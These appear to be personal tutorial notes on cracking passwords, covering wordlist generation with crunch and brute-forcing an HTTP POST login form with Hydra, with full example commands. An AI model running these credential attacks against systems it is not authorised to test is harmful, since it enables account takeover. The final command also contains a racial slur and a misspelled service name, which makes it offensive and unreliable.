#### Definition :
###### Brute Force Attack : 
Using all forms of combinations to crack a password / username, usually good if password has few characters / digits

###### Dictionary attack :
Using a wordlist ( custom or downloaded ) and trying every single password from wordlist

#### Creating a wordlist using crunch :
Use - `crunch [min length] [max length] [characters to be used] -o [file name] -t [pattern]`

`Note : -t is optional and used if we want certain letters / digits in wordist`

Ex 1 : `crunch 4 4 123abc$ -o wordlist.txt -t a@@b`
Ex 2 : `crunch 4 6 12abc$ -o wordlist.txt`


#### Using Hydra to brute force :
`hydra -h` - for all commands

Basic Syntax : `hydra (thier ip) -l (username name) -P (file location consisting of wordlist)` <span style ="color : cyan">service_type </span> <span style ="color : magenta">"service"</span>

`Note : use -L (location of file containing username wordlist`

**I used** `http-post-form` **service_type cause I did inspect element and checked it to be post** 

for service do : `hydra -U http-post-form`, A long description should come 

Generally : service consists of **3 parts** each separated by `:`  being :
1. <span style ="color : lime">Rest of the URL excluding ip</span>

2. <span style ="color : orange">(username_variable)=^USER^&(password_variable)=^PASS^ ( other stuff )</span>

`Note : to find username and password use burp suite proxy to intercept go to headers section and` **also copy paste if anything besides variables is there**

3. <span style ="color : magenta ">F = (message appearing when wrong password)</span>

Final Code Example :

`hydra` <span style="color: yellow">IP or Domain name</span>  `-l` <span style="color: yellow">admin</span> `-P` <span style="color: yellow">/root/test.txt</span> <span style="color: cyan">http-post-form</span> `"` <span style="color: lime">Login Page Path</span> `:` <span style="color: orange">username=^USER^&password=^PASS^&login-php-submit-button=Login</span> `:` <span style="color: magenta">F=Not Logged In</span> `"`

Or 
```bash
hydra -l admin -P rockyou.txt -f target.com -s (port) htp-post-form "/login.php:username=^USER^&password=^PASS^:wrong password nigga." -t 64 -IV
```





